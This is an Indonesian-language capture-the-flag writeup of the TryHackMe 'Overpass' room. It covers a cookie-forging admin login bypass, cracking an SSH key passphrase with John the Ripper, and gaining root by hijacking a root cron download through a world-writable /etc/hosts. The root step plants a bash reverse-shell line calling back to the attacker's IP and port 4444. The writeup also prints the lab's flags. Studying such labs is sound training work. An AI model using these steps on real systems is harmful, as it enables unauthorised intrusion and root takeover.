**Dokumentasikan langkah-langkah eksploitasi yang baru saja kamu lakukan di room Overpass TryHackMe.**
# Overpass - TryHackMe Writeup

Dokumentasi langkah-langkah eksploitasi mesin **Overpass** di platform TryHackMe. Fokus utama pada *Broken Authentication*, *Cryptography Cracking*, dan *Privilege Escalation* melalui *Insecure File Permissions*.

## 1. Enumeration
Langkah awal dilakukan dengan pemindaian port menggunakan `nmap`:
- **Port 22 (SSH)**: Terbuka.
- **Port 80 (HTTP)**: Terbuka (Golang web server).

## 2. Exploitation (User Access)

### Bypass Admin Login
1. Mengakses halaman `/admin`.
   ```http://10.49.165.219/admin/```
2. Melakukan bypass autentikasi dengan memodifikasi Cookie melalui *Browser Console*:
   ```javascript
   document.cookie = "SessionToken=anything"
   ```
3. Refresh halaman untuk mendapatkan akses ke area admin yang berisi pesan untuk James dan sebuah RSA Private Key.
 
<img width="1364" height="682" alt="123" src="https://github.com/user-attachments/assets/bedca337-17c6-4ae8-bb52-7b1cce9ac49d" />

## 3. RSA Passphrase Cracking
Kunci RSA yang didapat terenkripsi, sehingga perlu di-crack menggunakan John the Ripper:

    Mengubah kunci RSA ke format hash:
    
```bash

python3 ssh2john.py id_rsa > rsa_hash
```
Cracking passphrase menggunakan wordlist rockyou.txt:

```bash

john --wordlist=/usr/share/wordlists/rockyou.txt rsa_hash
```
Hasil: Passphrase adalah james13.

## 4. SSH Access

Login sebagai user james:

```bash
chmod 600 id_rsa
ssh -i id_rsa james@<TARGET_IP>
```
<img width="469" height="81" alt="image" src="https://github.com/user-attachments/assets/9c82fd30-1955-484a-9e58-d6404a151c54" />

User Flag: ```thm{65c1aaf000506e56996822c6281e6bf7}```

## 3. Privilege Escalation (Root Access)
Analisis Celah
Ditemukan bahwa file /etc/hosts bersifat world-writable (-rw-rw-rw-). Selain itu, terdapat Cron Job milik root yang mendownload skrip secara berkala dari domain overpass.thm.
DNS Poisoning Lokal

    Mengedit /etc/hosts di mesin target:
    text

    <IP_KALI_TUN0> overpass.thm

Reverse Shell Payload

    Di mesin Kali, buat struktur folder yang sesuai dengan permintaan cron job:
    bash

    mkdir -p downloads/src
    echo "bash -i >& /dev/tcp/<IP_KALI_TUN0>/4444 0>&1" > downloads/src/buildscript.sh
    
<img width="692" height="98" alt="image" src="https://github.com/user-attachments/assets/090b0961-d239-4860-8766-73ebf58c4dac" />


Jalankan HTTP Server pada port 80 di mesin Kali:
bash

sudo python3 -m http.server 80

<img width="744" height="209" alt="image" src="https://github.com/user-attachments/assets/9e8d4d70-4b8b-4e86-90a2-2a2bd00fa1e8" />

Gunakan kode dengan hati-hati.
Jalankan Netcat Listener:
bash

nc -lvnp 4444

<img width="701" height="439" alt="image" src="https://github.com/user-attachments/assets/018ab877-b003-4e90-99f0-b131ce269b12" />

thm{7f336f8c359dbac18d54fdd64ea753bb}

Kesimpulan
Mesin ini mengajarkan pentingnya:

    Validasi autentikasi sisi server yang kuat (jangan hanya mengandalkan keberadaan cookie).
    Manajemen izin file sistem yang ketat (terutama /etc/hosts).
    Penggunaan passphrase yang kuat untuk kunci SSH.
    
